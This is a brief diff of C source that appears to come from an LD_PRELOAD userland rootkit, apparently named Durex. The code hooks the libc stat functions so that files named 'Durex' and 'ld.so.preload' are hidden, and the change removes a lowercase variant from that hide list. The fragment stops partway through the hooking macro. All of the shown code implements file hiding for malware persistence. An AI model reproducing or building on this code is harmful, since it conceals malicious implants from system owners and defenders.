@@ -4,7 +4,7 @@
 #include<sys/stat.h>
 #include<errno.h>
 #include<string.h>
-static const char*process_to_filter[]={"Durex","durex","ld.so.preload",0};
+static const char*process_to_filter[]={"Durex","ld.so.preload",0};
 #define DECLARE_XSTAT(xstat,stat) \
 static int(*original_##xstat)(int,const char*,struct stat*)=NULL;\
 int xstat(int ver,const char*pathname, struct stat*buf){\
